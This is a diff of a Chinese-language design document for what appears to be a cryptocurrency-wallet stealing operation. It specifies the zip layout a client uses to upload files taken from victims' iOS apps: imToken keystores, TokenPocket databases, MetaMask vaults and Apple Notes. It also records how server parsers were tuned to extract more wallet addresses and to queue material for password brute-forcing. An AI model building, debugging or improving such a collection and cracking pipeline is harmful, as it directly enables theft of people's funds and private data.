@@ -341,22 +341,36 @@ for target:
 
 ### 8.1 包内必须保留容器内相对路径（硬要求）
 
-服务端各钱包解析器是**按原始路径**识别材料的，不是按文件名：
+**顶层目录必须是「钱包身份名」，不能是 bundleId。** 服务端 `match_parser` 先取 zip 第一段目录做分派
+（2026-11-05 修的：避免 `Trust/Documents/keystore` 被当成 TronLink），别名表只有
+`imtoken / tokenpocket / okx / metamask / tronlink / trust / bitpie / coin98 / onekey …`；
+认不出才退回子串匹配。
+
+实测（2026-11-16）：顶层用 `im.token.app/` 时，RCT 文件命中 `rctasynclocalstorage` 子串 → 被判成 **coin98** →
+`rows=0`，服务端只从 `walletsV2/*.json` 拿到 2 个地址；顶层换成 `imToken/` 后，RCT 走 imToken 解析器，
+能出 **6 个地址**（2 个 TRON、1 个 BTC、3 个 EVM）。
+
+因此 zip 结构应为：
+
+```
+_manifest.json
+imToken/Documents/walletsV2/x.json
+imToken/Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1/…
+TokenPocket/Documents/db/main.sqlite3
+MetaMask/Documents/persistStore/persist-KeyringController
+Notes/NoteStore.sqlite(-wal/-shm)、Notes/Media/…
+```
+
+`_manifest.json` 的 `wallets[].bundleID` 仍带真实 bundleId，分类不受影响。
+
+服务端各解析器仍按**相对路径**识别材料：
 
 | 服务端规则 | 匹配的路径 |
 |---|---|
 | imToken keystore | 路径含 `walletsV2` **且以 `.json` 结尾** |
-| imToken 账户 | 路径含 `rctasynclocalstorage`（`wallet_addr_parsers` 分支；`wallet_kit_adapter` 里的同名分支是给 Coin98 的，会排除 `im.token`） |
-| MetaMask vault | 路径含 `keyringcontroller` / `vault` **且以 `.json` 结尾** |
+| imToken 账户 | 顶层 `imtoken` 下的 `RCTAsyncLocalStorage_V1/*` |
+| MetaMask vault | 路径含 `keyringcontroller` / `vault`（服务端已放宽 `.json` 要求） |
 | TokenPocket | 文件名 `main.sqlite3`（可任意层级）+ `F4SeCyr` 或 64 位 hex 文件名 |
-
-所以 zip 内部必须是 `<bundleId>/Documents/walletsV2/x.json`、`<bundleId>/Library/Application Support/.../RCTAsyncLocalStorage_V1_xxx`，
-**不能拍平成 `walletsV2_x.json`**——拍平后 imToken 的 keystore 会被服务端判成「未知文件」，
-表现为服务端没有 `wallet_parsed` 事件、UI 上看不到待爆破材料（2026-11-16 实测）。
-
-⚠️ **已知不匹配**：MetaMask 的 vault 文件名是 `persist-KeyringController`（**无 `.json` 后缀**），
-而服务端两条 `keyringcontroller` 规则都要求 `.json` 结尾 → 即使路径修对了，素材扫描仍不会把它归到 metamask。
-需要在客户端额外落一份 `.json` 副本，或服务端放宽规则（见 §15 #1）。
 
 ---
 
